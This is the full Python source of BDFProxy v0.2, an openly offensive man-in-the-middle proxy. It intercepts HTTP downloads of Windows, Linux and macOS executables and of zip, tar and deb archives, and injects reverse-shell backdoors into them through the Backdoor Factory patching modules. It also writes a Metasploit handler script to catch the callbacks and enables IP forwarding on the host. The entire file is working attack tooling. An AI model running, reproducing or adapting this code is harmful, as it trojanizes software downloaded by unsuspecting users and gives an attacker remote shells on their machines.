#!/usr/bin/env python
"""
    BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    Copyright (c) 2013-2014, Joshua Pitts
    All rights reserved.
    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:
        1. Redistributions of source code must retain the above copyright notice,
        this list of conditions and the following disclaimer.
        2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.
        3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software without
        specific prior written permission.
    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
    Tested on Kali-Linux.
"""

from libmproxy import controller, proxy, platform
from libmproxy.proxy.server import ProxyServer
from tempfile import mkstemp
import os
from bdf import pebin
from bdf import elfbin
from bdf import machobin
import shutil
import sys
import pefile
import logging
import tempfile
import libarchive
import magic
from contextlib import contextmanager
from configobj import ConfigObj


@contextmanager
def in_dir(dirpath):
    prev = os.path.abspath(os.getcwd())
    os.chdir(dirpath)
    try:
        yield
    finally:
        os.chdir(prev)


def writeResource(resourceFile, Values):
    with open(resourceFile, 'w') as f:
        f.write("#USAGE: msfconsole -r thisscriptname.rc\n\n\n")
        writeStatement0 = "use exploit/multi/handler\n"
        writeStatement1 = ""
        writeStatement2 = ""
        writeStatement3 = ""
        writeStatement4 = "set ExitOnSession false\n\n"
        writeStatement5 = "exploit -j -z\n\n"
        for aDictionary in Values:
            if isinstance(aDictionary, dict):
                if aDictionary != {}:
                    for key, value in aDictionary.items():
                        if key == 'MSFPAYLOAD':
                            writeStatement1 = 'set PAYLOAD ' + str(value) + "\n"
                        if key == "HOST":
                            writeStatement2 = 'set LHOST ' + str(value) + "\n"
                        if key == "PORT":
                            writeStatement3 = 'set LPORT ' + str(value) + "\n"
                    f.write(writeStatement0)
                    f.write(writeStatement1)
                    f.write(writeStatement2)
                    f.write(writeStatement3)
                    f.write(writeStatement4)
                    f.write(writeStatement5)


def dictParse(d):
    tmpValues = {}
    for key, value in d.iteritems():
        if isinstance(value, dict):
            dictParse(value)
        if key == 'HOST':
            tmpValues['HOST'] = value
        if key == 'PORT':
            tmpValues['PORT'] = value
        if key == 'MSFPAYLOAD':
            tmpValues['MSFPAYLOAD'] = value

    resourceValues.append(tmpValues)

def print_size(f):
    size = len(f) / 1024
    EnhancedOutput.print_info("File size: {0} KB".format(size))


class EnhancedOutput:
    @staticmethod
    def print_error(txt):
        print "[x] {0}".format(txt)

    @staticmethod
    def print_info(txt):
        print "[*] {0}".format(txt)

    @staticmethod
    def print_warning(txt):
        print "[!] {0}".format(txt)

    @staticmethod
    def logging_error(txt):
        logging.error("[x] Error: {0}".format(txt))

    @staticmethod
    def logging_warning(txt):
        logging.warning("[!] Warning: {0}".format(txt))

    @staticmethod
    def logging_info(txt):
        logging.info("[*] {0}".format(txt))

    @staticmethod
    def logging_debug(txt):
        logging.debug("[.] Debug: {0}".format(txt))


class ArchiveType:
    blacklist = []
    maxSize = 0
    patchCount = 0

    def __init__(self, arType):
        try:
            userConfig = ConfigObj(CONFIGFILE)
            self.blacklist = userConfig[arType]['blacklist']
            self.maxSize = int(userConfig[arType]['maxSize'])
            self.patchCount = int(userConfig[arType]['patchCount'])
        except Exception as e:
            raise Exception("Missing {0}".format(e))

class ProxyMaster(controller.Master):
    def __init__(self, srv):
        controller.Master.__init__(self, srv)

        self.binaryMimeType = {'mimes': ['application/octet-stream', 'application/x-msdownload',
                                'application/x-msdos-program', 'binary/octet-stream',
                                'application/x-executable', 'application/x-dosexec']}

        self.zipType = {'mimes': ['application/x-zip-compressed', 'application/zip'], 'params': {'type': 'ZIP', 'format': 'zip', 'filter': None}}  # .zip

        self.debType = {'mimes': ['application/x-debian-package', 'application/sarcazzi'], 'params': None}  # .deb

        self.gzType = {'mimes': ['application/gzip', 'application/x-gzip', 'application/gnutar'], 'params': {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}}  # .gz

        self.tarType = {'mimes': ['application/x-tar'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': None}}  # .tar

        self.bzType = {'mimes': ['application/x-bzip2', 'application/x-bzip'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': 'bzip2'}}  # .bz / .bz2

        self.arType = {'mimes': ['application/x-archive'], 'params': {'type': 'AR', 'format': 'ar_bsd', 'filter': None}}  # .ar

        self.xzType = {'mimes': ['application/x-xz'], 'params': {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}}  # .xz

        self.archiveTypes = [self.zipType, self.gzType, self.tarType, self.bzType, self.arType, self.xzType]

        self.patchIT = False

    def run(self):
        try:
            EnhancedOutput.logging_debug("Starting ProxyMaster")
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def setConfig(self):
        try:
            self.userConfig = ConfigObj(CONFIGFILE)
            self.host_blacklist = self.userConfig['hosts']['blacklist']
            self.host_whitelist = self.userConfig['hosts']['whitelist']
            self.keys_blacklist = self.userConfig['keywords']['blacklist']
            self.keys_whitelist = self.userConfig['keywords']['whitelist']
        except Exception as e:
            EnhancedOutput.print_error("Missing field from config file" + str(e))

    # archInfo example: {'type':'TAR', 'format':'gnutar', 'filter':'bzip2'}
    def archive_files(self, archFileBytes, archInfo, include_dirs=False):

        try:
            archiveType = ArchiveType(archInfo['type'])
        except Exception as ex:
            EnhancedOutput.print_error(str(ex))
            EnhancedOutput.print_warning("Returning original file")
            EnhancedOutput.logging_error("Error setting archive type: {0}. Returning original file.".format(e))
            return archFileBytes

        print_size(archFileBytes)

        if len(archFileBytes) > archiveType.maxSize:
            EnhancedOutput.print_error("{0} over allowed size".format(archInfo['type']))
            EnhancedOutput.logging_info("{0} maxSize met {1}".format(archInfo['type'], len(archFileBytes)))
            return archFileBytes

        tmpDir = tempfile.mkdtemp()

        try:
            with in_dir(tmpDir):
                flags = libarchive.extract.EXTRACT_OWNER | libarchive.extract.EXTRACT_PERM | libarchive.extract.EXTRACT_TIME
                libarchive.extract_memory(archFileBytes, flags)
        except Exception as exce:
            EnhancedOutput.print_error("Can't extract file. Returning original one")
            EnhancedOutput.logging_error("Can't extract file: {0}. Returning original one.".format(exce))
            return archFileBytes

        EnhancedOutput.print_info("{0} file contents and info".format(archInfo['type']))
        EnhancedOutput.print_info("Compression: {0}".format(archInfo['filter']))

        files_list = list()
        for dirname, dirnames, filenames in os.walk(tmpDir):
            dirz = dirname.replace(tmpDir, ".")
            print "\t{0}".format(dirz)
            if include_dirs:
                files_list.append(dirz)
            for f in filenames:
                fn = os.path.join(dirz, f)
                files_list.append(fn)
                print "\t{0} {1}".format(fn, os.lstat(os.path.join(dirname, f)).st_size)

        patchCount = 0
        wasPatched = False
        tmpArchive = tempfile.NamedTemporaryFile()

        try:
            with libarchive.file_writer(tmpArchive.name, archInfo['format'], archInfo['filter']) as archive:
                for filename in files_list:
                    full_path = os.path.join(tmpDir, filename)
                    EnhancedOutput.print_info(">>> Next file in archive: {0}".format(filename))

                    if os.path.islink(full_path) or not os.path.isfile(full_path):
                        EnhancedOutput.print_warning("{0} is not a file, skipping".format(filename))
                        with in_dir(tmpDir):
                            archive.add_files(filename)
                        continue

                    if os.lstat(full_path).st_size >= long(self.FileSizeMax):
                        EnhancedOutput.print_warning("{0} is too big, skipping".format(filename))
                        with in_dir(tmpDir):
                            archive.add_files(filename)
                        continue

                    # Check against keywords
                    keywordCheck = False

                    if type(archiveType.blacklist) is str:
                        if archiveType.blacklist.lower() in filename.lower():
                            keywordCheck = True
                    else:
                        for keyword in archiveType.blacklist:
                            if keyword.lower() in filename.lower():
                                keywordCheck = True
                                continue

                    if keywordCheck is True:
                        EnhancedOutput.print_warning("Archive blacklist enforced!")
                        EnhancedOutput.logging_info('Archive blacklist enforced on {0}'.format(filename))
                        continue

                    if patchCount >= archiveType.patchCount:
                        with in_dir(tmpDir):
                            archive.add_files(filename)
                        EnhancedOutput.logging_info("Met archive config patchCount limit. Adding original file")
                    else:
                        # create the file on disk temporarily for binaryGrinder to run on it
                        tmp = tempfile.NamedTemporaryFile()
                        shutil.copyfile(full_path, tmp.name)
                        tmp.flush()
                        patchResult = self.binaryGrinder(tmp.name)
                        if patchResult:
                            patchCount += 1
                            file2 = os.path.join(BDFOLDER, os.path.basename(tmp.name))
                            EnhancedOutput.print_info("Patching complete, adding to archive file.")
                            shutil.copyfile(file2, full_path)
                            EnhancedOutput.logging_info("{0} in archive patched, adding to final archive".format(filename))
                            os.remove(file2)
                            wasPatched = True
                        else:
                            EnhancedOutput.print_error("Patching failed")
                            EnhancedOutput.logging_error("{0} patching failed. Keeping original file.".format(filename))

                        with in_dir(tmpDir):
                            archive.add_files(filename)
                        tmp.close()

        except Exception as exc:
            EnhancedOutput.print_error("Error while creating the archive: {0}. Returning the original file.".format(exc))
            EnhancedOutput.logging_error("Error while creating the archive: {0}. Returning original file.".format(exc))
            shutil.rmtree(tmpDir, ignore_errors=True)
            tmpArchive.close()
            return archFileBytes


        with open(tmpArchive.name, 'r+b') as f:
            ret = f.read()
            f.close()

        # cleanup
        shutil.rmtree(tmpDir, ignore_errors=True)
        tmpArchive.close()

        if wasPatched is False:
            EnhancedOutput.print_info("No files were patched. Forwarding original file")
            return archFileBytes
        else:
            return ret

    def deb_files(self, debFile):
        try:
            archiveType = ArchiveType('AR')
        except Exception as e:
            EnhancedOutput.print_error(str(e))
            EnhancedOutput.print_warning("Returning original file")
            EnhancedOutput.logging_error("Error setting archive type: {0}. Returning original file.".format(e))
            return debFile

        print_size(debFile)

        if len(debFile) > archiveType.maxSize:
            EnhancedOutput.print_error("AR File over allowed size")
            EnhancedOutput.logging_info("AR File maxSize met {0}".format(len(debFile)))
            return debFile

        tmpDir = tempfile.mkdtemp()

        # first: save the stream to a local file
        tmpFile = tempfile.NamedTemporaryFile()
        tmpFile.write(debFile)
        tmpFile.seek(0)

        # chdir to the tmpDir which the new ar file resides
        # and extract it so work on the 'copy' of the stream
        with in_dir(tmpDir):
            libarchive.extract_file(tmpFile.name)

        file2inject = 'data.tar.gz'
        infoz = {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}

        if os.path.exists(os.path.join(tmpDir, 'data.tar.xz')):
            file2inject = 'data.tar.xz'
            infoz = {'type': 'LZMA', 'format': 'gnutar', 'filter': 'xz'}

        EnhancedOutput.print_info("Patching {0}".format(file2inject))
        # recreate the injected archive
        with open(os.path.join(tmpDir, file2inject), 'r+b') as f:
            bfz = f.read()
            f.seek(0)
            f.write(self.archive_files(bfz, infoz, include_dirs=True))
            f.flush()
            f.close()

        blk = []

        def write_data(data):
            blk.append(data[:])
            return len(data[:])

        with libarchive.custom_writer(write_data, 'ar_bsd') as archive:
            archive.add_files(os.path.join(tmpDir, 'debian-binary'))
            archive.add_files(os.path.join(tmpDir, 'control.tar.gz'))
            archive.add_files(os.path.join(tmpDir, file2inject))

        buf = b''.join(blk)

        # clean up
        shutil.rmtree(tmpDir, ignore_errors=True)
        tmpFile.close()

        return buf


    def str2bool(self, val):
        if val.lower() == 'true':
            return True
        elif val.lower() == 'false':
            return False
        else:
            return None

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """
        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                # update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                            self.WindowsType.lower() in ['all', 'x64']):
                    add_section = False
                    cave_jumping = False
                    if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
                        cave_jumping = True

                    targetFile = pebin.pebin(FILE=binaryFile,
                                             OUTPUT=os.path.basename(binaryFile),
                                             SHELL=self.WindowsIntelx64['SHELL'],
                                             HOST=self.WindowsIntelx64['HOST'],
                                             PORT=int(self.WindowsIntelx64['PORT']),
                                             ADD_SECTION=add_section,
                                             CAVE_JUMPING=cave_jumping,
                                             IMAGE_TYPE=self.WindowsType,
                                             PATCH_DLL=self.str2bool(self.WindowsIntelx64['PATCH_DLL']),
                                             SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                             ZERO_CERT=self.str2bool(self.WindowsIntelx64['ZERO_CERT']),
                                             PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower()
                                             )

                    result = targetFile.run_this()

                elif (machineType == 0x14c and
                              self.WindowsType.lower() in ['all', 'x86']):
                    add_section = False
                    cave_jumping = False
                    # add_section wins for cave_jumping
                    # default is single for BDF
                    if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
                        cave_jumping = True

                    targetFile = pebin.pebin(FILE=binaryFile,
                                             OUTPUT=os.path.basename(binaryFile),
                                             SHELL=self.WindowsIntelx86['SHELL'],
                                             HOST=self.WindowsIntelx86['HOST'],
                                             PORT=int(self.WindowsIntelx86['PORT']),
                                             ADD_SECTION=add_section,
                                             CAVE_JUMPING=cave_jumping,
                                             IMAGE_TYPE=self.WindowsType,
                                             PATCH_DLL=self.str2bool(self.WindowsIntelx86['PATCH_DLL']),
                                             SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
                                             ZERO_CERT=self.str2bool(self.WindowsIntelx86['ZERO_CERT']),
                                             PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower()
                                             )

                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    # x86CPU Type
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx86['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    # x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx64['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') in ['cefaedfe', 'cffaedfe', 'cafebabe']:  # Macho
                targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                # ONE CHIP SET MUST HAVE PRIORITY in FAT FILE

                if targetFile.FAT_FILE is True:
                    if self.FatPriority == 'x86':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx86['SHELL'],
                                                       HOST=self.MachoIntelx86['HOST'],
                                                       PORT=int(self.MachoIntelx86['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority
                                                       )
                        result = targetFile.run_this()

                    elif self.FatPriority == 'x64':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx64['SHELL'],
                                                       HOST=self.MachoIntelx64['HOST'],
                                                       PORT=int(self.MachoIntelx64['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority
                                                       )
                        result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx86['SHELL'],
                                                   HOST=self.MachoIntelx86['HOST'],
                                                   PORT=int(self.MachoIntelx86['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx64['SHELL'],
                                                   HOST=self.MachoIntelx64['HOST'],
                                                   PORT=int(self.MachoIntelx64['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()

            return result

        except Exception as e:
            EnhancedOutput.print_error('binaryGrinder: {0}'.format(e))
            EnhancedOutput.logging_warning("Exception in binaryGrinder {0}".format(e))
            return None

    def hosts_whitelist_check(self, flow):
        if self.host_whitelist.lower() == 'all':
            self.patchIT = True

        elif type(self.host_whitelist) is str:
            if self.host_whitelist.lower() in flow.request.host.lower():
                self.patchIT = True
                EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1}".format(self.host_whitelist, flow.request.host))
        elif flow.request.host.lower() in self.host_whitelist.lower():
            self.patchIT = True
            EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, flow.request.host))
        else:
            for keyword in self.host_whitelist:
                if keyword.lower() in flow.requeset.host.lower():
                    self.patchIT = True
                    EnhancedOutput.logging_info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, flow.request.host))
                    break

    def keys_whitelist_check(self, flow):
        # Host whitelist check takes precedence
        if self.patchIT is False:
            return None

        if self.keys_whitelist.lower() == 'all':
            self.patchIT = True
        elif type(self.keys_whitelist) is str:
            if self.keys_whitelist.lower() in flow.request.path.lower():
                self.patchIT = True
                EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
        elif flow.request.host.lower() in [x.lower() for x in self.keys_whitelist]:
            self.patchIT = True
            EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
        else:
            for keyword in self.keys_whitelist:
                if keyword.lower() in flow.requeset.path.lower():
                    self.patchIT = True
                    EnhancedOutput.logging_info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, flow.request.path))
                    break

    def keys_backlist_check(self, flow):
        if type(self.keys_blacklist) is str:
            if self.keys_blacklist.lower() in flow.request.path.lower():
                self.patchIT = False
                EnhancedOutput.logging_info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, flow.request.path))
        else:
            for keyword in self.keys_blacklist:
                if keyword.lower() in flow.request.path.lower():
                    self.patchIT = False
                    EnhancedOutput.logging_info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, flow.request.path))
                    break

    def hosts_blacklist_check(self, flow):
        if type(self.host_blacklist) is str:
            if self.host_blacklist.lower() in flow.request.host.lower():
                self.patchIT = False
                EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
        elif flow.request.host.lower() in [x.lower() for x in self.host_blacklist]:
            self.patchIT = False
            EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
        else:
            for host in self.host_blacklist:
                if host.lower() in flow.request.host.lower():
                    self.patchIT = False
                    EnhancedOutput.logging_info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, flow.request.host))
                    break

    def parse_target_config(self, targetConfig):
        for key, value in targetConfig.items():
            if hasattr(self, key) is False:
                setattr(self, key, value)
                EnhancedOutput.logging_debug("Settings Config {0}: {1}".format(key, value))

            elif getattr(self, key, value) != value:
                if value == "None":
                    continue

                # test if string can be easily converted to dict
                if ':' in str(value):
                    for tmpkey, tmpvalue in dict(value).items():
                        getattr(self, key, value)[tmpkey] = tmpvalue
                        EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(tmpkey, tmpvalue))
                else:
                    setattr(self, key, value)
                    EnhancedOutput.logging_debug("Updating Config {0}: {1}".format(key, value))

    def handle_request(self, flow):
        print "*" * 10, "REQUEST", "*" * 10
        EnhancedOutput.print_info("HOST: {0}".format(flow.request.host))
        EnhancedOutput.print_info("PATH: {0}".format(flow.request.path))
        flow.reply()
        print "*" * 10, "END REQUEST", "*" * 10

    def handle_response(self, flow):
        # Read config here for dynamic updating

        for target in self.userConfig['targets'].keys():
            if target == 'ALL':
                self.parse_target_config(self.userConfig['targets']['ALL'])

            if target in flow.request.host:
                self.parse_target_config(self.userConfig['targets'][target])

        print "=" * 10, "RESPONSE", "=" * 10

        EnhancedOutput.print_info("HOST: {0}".format(flow.request.host))
        EnhancedOutput.print_info("PATH: {0}".format(flow.request.path))

        # Below are gates from whitelist --> blacklist
        # Blacklists have the final say, but everything starts off as not patchable
        # until a rule says True. Host whitelist over rides keyword whitelist.

        self.hosts_whitelist_check(flow)
        self.keys_whitelist_check(flow)
        self.keys_backlist_check(flow)
        self.hosts_blacklist_check(flow)

        if 'content-length' in flow.request.headers.keys():
            if int(flow.request.headers['content-length'][0]) >= long(self.FileSizeMax):
                EnhancedOutput.print_warning("Not patching over content-length, forwarding to user")
                EnhancedOutput.logging_info("Over FileSizeMax setting {0} : {1}".format(flow.request.host, flow.request.path))
                self.patchIT = False

        if self.patchIT is False:
            EnhancedOutput.print_warning("Not patching, flow did not make it through config settings")
            EnhancedOutput.logging_info("Config did not allow the patching of HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))

            flow.reply()
        else:

            mime_type = magic.from_buffer(flow.reply.obj.response.content, mime=True)

            if mime_type in self.debType['mimes'] and self.str2bool(self.CompressedFiles) is True:
                flow.reply.obj.response.content = self.deb_files(flow.reply.obj.response.content)

            elif mime_type in self.binaryMimeType['mimes']:
                tmp = tempfile.NamedTemporaryFile()
                tmp.write(flow.reply.obj.response.content)
                tmp.flush()
                tmp.seek(0)

                patchResult = self.binaryGrinder(tmp.name)
                if patchResult:
                    EnhancedOutput.print_info("Patching complete, forwarding to user.")
                    EnhancedOutput.logging_info("Patching complete for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))

                    with open(os.path.join(BDFOLDER, os.path.basename(tmp.name)), 'r+b') as file2:
                        flow.reply.obj.response.content = file2.read()
                else:
                    EnhancedOutput.print_error("Patching failed")
                    EnhancedOutput.logging_info("Patching failed for HOST: {0}, PATH: {1}".format(flow.request.host, flow.request.path))

                tmp.close()
            else:
                for archive in self.archiveTypes:
                    if mime_type in archive['mimes'] and self.str2bool(self.CompressedFiles) is True:
                        flow.reply.obj.response.content = self.archive_files(flow.reply.obj.response.content, archive['params'])

            flow.reply()

        print "=" * 10, "END RESPONSE", "=" * 10

################################## START MAIN #######################################

CONFIGFILE = "bdfproxy.cfg"
BDFOLDER = "backdoored"

# Initial CONFIG reading
userConfig = ConfigObj(CONFIGFILE)

#################### BEGIN OVERALL CONFIGS ############################
# DOES NOT UPDATE ON THE FLY
resourceScript = userConfig['Overall']['resourceScriptFile']

config = proxy.ProxyConfig(clientcerts=os.path.expanduser(userConfig['Overall']['certLocation']),
                           body_size_limit=int(userConfig['Overall']['MaxSizeFileRequested']),
                           port=int(userConfig['Overall']['proxyPort']),
                           mode=userConfig['Overall']['proxyMode'],
                           )

if userConfig['Overall']['proxyMode'] != "None":
    config.proxy_mode = {'sslports': userConfig['Overall']['sslports'],
                         'resolver': platform.resolver()
                         }

server = ProxyServer(config)

numericLogLevel = getattr(logging, userConfig['Overall']['loglevel'].upper(), None)

if not isinstance(numericLogLevel, int):
    EnhancedOutput.print_error("INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
    sys.exit(1)

logging.basicConfig(filename=userConfig['Overall']['logname'],
                    level=numericLogLevel,
                    format='%(asctime)s %(message)s'
                    )

#################### END OVERALL CONFIGS ##############################

# Write resource script
EnhancedOutput.print_warning("Writing resource script.")
resourceValues = []
dictParse(userConfig['targets'])
try:
    writeResource(str(resourceScript), resourceValues)
except Exception as e:
    EnhancedOutput.print_error(str(e))
    sys.exit(1)

EnhancedOutput.print_warning("Resource writen to {0}".format(str(resourceScript)))
EnhancedOutput.print_warning("Configuring forwarding ('echo 1 > /proc/sys/net/ipv4/ip_forward')")

try:
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
except Exception as e:
    EnhancedOutput.print_error(str(e))
    sys.exit(1)

m = ProxyMaster(server)
try:
    m.setConfig()
except Exception as e:
    EnhancedOutput.print_error("Your config file is broken: {0}".format(e))
    EnhancedOutput.logging_error("Your config file is broken: {0}".format(e))
    sys.exit(1)

EnhancedOutput.print_info("Starting BDFProxy")
EnhancedOutput.print_info("Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com")
EnhancedOutput.logging_info("################ Starting BDFProxy-ng ################")
m.run()
